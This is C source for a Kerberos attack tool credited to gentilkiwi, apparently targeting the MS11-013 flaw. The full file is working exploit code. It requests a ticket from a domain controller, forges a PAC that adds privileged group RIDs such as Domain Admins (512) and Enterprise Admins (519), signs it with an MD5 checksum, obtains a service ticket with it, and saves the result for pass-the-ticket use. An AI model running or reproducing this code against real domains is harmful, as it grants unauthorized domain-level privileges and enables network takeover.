/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by-nc-sa/4.0/
*/
#include "ms11013.h"

BOOL g_isAsn1Init = FALSE, g_isSockInit = FALSE, g_isKerberos = FALSE;

BOOL init()
{
	BOOL status = FALSE;
	RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
	MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;

	if(g_isAsn1Init = kull_m_kerberos_asn1_helper_init())
		if(g_isSockInit = kull_m_sock_startup())
			if(g_isKerberos = kull_m_kerberos_helper_init())
				status = TRUE;
	return status;
}

BOOL term()
{
	if(g_isAsn1Init)
		g_isAsn1Init = !kull_m_kerberos_asn1_helper_term();
	if(g_isSockInit)
		g_isSockInit = !kull_m_sock_finish();
	if(g_isKerberos)
		g_isKerberos = !kull_m_kerberos_helper_term();

	return !(g_isAsn1Init || g_isSockInit || g_isKerberos);
}

GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
int main(int argc, char * argv[])
{
	KIWI_AUTH_INFOS authInfo;
	LPCSTR szTarget, szService, szSid, szRid, szKdc = NULL, szFilename = NULL, szGroups, szSids, base;
	PSTR baseSid, tmpSid, szWhatDC = NULL;
	PSID sid = NULL, domainSid = NULL, pSidTmp;
	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
	PKERB_SID_AND_ATTRIBUTES sids = NULL;
	DWORD rid = 0, i, j, nbGroups, nbSids = 0;

	kprintf("\n"
		"  .#####.   " MIMIKATZ_FULL "\n"
		" .## ^ ##.  " MIMIKATZ_SECOND "\n"
		" ## / \\ ##  /* * *\n"
		" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
		" '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)\n"
		"  '#####'    ...   with thanks to Tom Maddock & Sylvain Monne * * */\n\n");

	if(init())
	{
		if(!kull_m_string_args_byName(argc, argv, "ptt", NULL, NULL))
			kull_m_string_args_byName(argc, argv, "ticket", &szFilename, TICKET_FILENAME);

		if(kull_m_kerberos_helper_getAuthInfo(argc, argv, &authInfo))
		{
			if(kull_m_string_args_byName(argc, argv, "target", &szTarget, NULL))
			{
				if(kull_m_string_args_byName(argc, argv, "service", &szService, NULL))
				{
					if(kull_m_string_args_byName(argc, argv, "groups", &szGroups, NULL))
					{
						for(nbGroups = 0, base = szGroups; base && *base; )
						{
							if(strtoul(base, NULL, 0))
								nbGroups++;
							if(base = strchr(base, ','))
								base++;
						}
						if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
						{
							for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
							{
								if(j = strtoul(base, NULL, 0))
								{
									dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
									dynGroups[i].RelativeId = j;
									i++;
								}
								if(base = strchr(base, ','))
									base++;
							}
						}
					}
					if(nbGroups && dynGroups)
						groups = dynGroups;
					else
					{
						groups = defaultGroups;
						nbGroups = ARRAYSIZE(defaultGroups);
					}

					if(kull_m_string_args_byName(argc, argv, "sids", &szSids, NULL))
					{
						if(tmpSid = _strdup(szSids))
						{
							for(nbSids = 0, base = tmpSid; base && *base; )
							{
								if(baseSid = strchr(base, ','))
									*baseSid = L'\0';
								if(ConvertStringSidToSid(base, (PSID *) &pSidTmp))
								{
									nbSids++;
									LocalFree(pSidTmp);
								}
								if(base = baseSid)
									base++;
							}
							free(tmpSid);
						}
						if(nbSids && (sids = (PKERB_SID_AND_ATTRIBUTES) LocalAlloc(LPTR, nbSids * sizeof(KERB_SID_AND_ATTRIBUTES))))
						{
							if(tmpSid = _strdup(szSids))
							{
								for(i = 0, base = tmpSid; (base && *base) && (i < nbSids); )
								{
									if(baseSid = strchr(base, ','))
										*baseSid = L'\0';
									if(ConvertStringSidToSid(base, (PSID *) &sids[i].Sid))
										sids[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
									if(base = baseSid)
										base++;
								}
								free(tmpSid);
							}
						}
					}

					if(!kull_m_string_args_byName(argc, argv, "kdc", &szKdc, NULL))
					{
						if(kull_m_kerberos_helper_net_getDC(authInfo.szDomain, DS_KDC_REQUIRED, &szWhatDC))
						{
							kprintf("[KDC] \'%s\' will be the main server\n", szWhatDC);
							szKdc = szWhatDC;
						}
					}
					if(szKdc)
					{
						if(kull_m_string_args_byName(argc, argv, "sid", &szSid, NULL))
							if(!ConvertStringSidToSid(szSid, &sid))
								PRINT_ERROR_AUTO("ConvertStringSidToSid");
						if(kull_m_string_args_byName(argc, argv, "rid", &szRid, NULL))
							rid = strtoul(szRid, NULL, 0);

						if(!(sid && rid))
						{
							if(authInfo.szPassword)
								kull_m_kerberos_helper_util_impersonateToGetData(authInfo.szUser, authInfo.szDomain, authInfo.szPassword, szKdc, sid ? NULL : &sid, rid ? NULL : &rid, NULL, NULL);
							else PRINT_ERROR("Impersonate is only supported with a password (you need SID & RID)\n");
						}

						if(sid && rid)
						{
							kprintf("target   : %s\n"
									"service  : %s\n"
									"sid      : "
									, szTarget, szService);
							kull_m_string_displaySID(sid);
							kprintf("\nrid      : %u", rid);
							kprintf("\ngroups   : *");
							for(i = 0; i < nbGroups; i++)
								kprintf("%u ", groups[i].RelativeId);
							if(nbSids)
							{
								kprintf("\nesids    : ");
								for(i = 0; i < nbSids; i++)
								{
									kull_m_string_displaySID(sids[i].Sid);
									kprintf(" ; ");
								}
							}
							kprintf("\nticket   : %s\n", szFilename ? szFilename : "** Pass The Ticket **");

							if(szKdc)
							{
								if(!szWhatDC)
									kprintf("kdc      : %s\n\n", szKdc);
								makeInception(&authInfo, sid, rid, szTarget, szService, groups, nbGroups, sids, nbSids, szKdc, KERBEROS_DEFAULT_PORT, szFilename);
							}
							else PRINT_ERROR("No KDC at all\n");
							LocalFree(sid);
						}
						else PRINT_ERROR("Missing valid SID & RID (argument or auto)\n");
					}
					else PRINT_ERROR("Missing one valid DC (argument or auto)\n");
					if(szWhatDC)
						LocalFree(szWhatDC);
					if(dynGroups)
						LocalFree(dynGroups);
					if(sids && nbSids)
					{
						for(i = 0; i < nbSids; i++)
							LocalFree(sids[i].Sid);
						LocalFree(sids);
					}
				}
				else PRINT_ERROR("Missing service argument\n");
			}
			else PRINT_ERROR("Missing target argument\n");
			kull_m_kerberos_helper_freeAuthInfo(&authInfo);
		}
	}
	else PRINT_ERROR("init() failed\n");
	term();
	return 0;
}

void makeInception(PKIWI_AUTH_INFOS authInfo, PSID sid, DWORD rid, PCSTR target, PCSTR service, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, PCSTR kdc, WORD port, PCSTR filename)
{
	SOCKET connectSocket;
	OssBuf AsReq, TgsReq;
	KDC_REP *AsRep, *TgsRep;
	EncKDCRepPart *encAsRepPart, *encTgsRepPart;
	_octet1 pac;

	if(kull_m_sock_initSocket(kdc, port, &connectSocket))
	{
		kprintf(" [level   1] Reality       (AS-REQ)\n");
		if(kull_m_kerberos_asn1_helper_build_AsReq_Generic(authInfo, NULL, NULL, NULL, FALSE, &AsReq))
		{
			if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &AsReq, (LPVOID *) &AsRep, AS_REP_PDU))
			{
				if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_AsRep_Generic(authInfo, AsRep, &encAsRepPart))
				{
					kprintf(" [level   2] Van Chase     (PAC TIME)\n");
					if(kuhl_m_pac_giveMePac(authInfo->szUser, authInfo->szNetbiosDomain, sid, rid, groups, cbGroups, sids, cbSids, &encAsRepPart->authtime, KERB_CHECKSUM_MD5, NULL, &pac))
					{
						kprintf(" [level   3] The Hotel     (TGS-REQ)\n");
						if(kull_m_kerberos_asn1_helper_build_KdcReq_key(authInfo->szUser, authInfo->szDomain, &encAsRepPart->key, service, target, NULL, FALSE, &AsRep->ticket, &pac, &TgsReq))
						{
							if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSocket, &TgsReq, (LPVOID *) &TgsRep, TGS_REP_PDU))
							{
								if(kull_m_kerberos_asn1_helper_build_EncKDCRepPart_from_Rep_key(TgsRep, &encTgsRepPart, &encAsRepPart->key, EncTGSRepPart_PDU))
								{
									kprintf(" [level 4-5] Limbo         (KRB-CRED)\n");
									kull_m_kerberos_helper_util_SaveRepAsKrbCred(TgsRep, encTgsRepPart, filename);
									kull_m_kerberos_asn1_helper_ossFreePDU(EncTGSRepPart_PDU, encTgsRepPart);
								}
								kull_m_kerberos_asn1_helper_ossFreePDU(TGS_REP_PDU, TgsRep);
							}
							kull_m_kerberos_asn1_helper_ossFreeBuf(TgsReq.value);
						}
						LocalFree(pac.value);
					}
					kull_m_kerberos_asn1_helper_ossFreePDU(EncASRepPart_PDU, encAsRepPart);
				}
				kull_m_kerberos_asn1_helper_ossFreePDU(AS_REP_PDU, AsRep);
			}
			kull_m_kerberos_asn1_helper_ossFreeBuf(AsReq.value);
		}
		kull_m_sock_termSocket(&connectSocket);
	}
}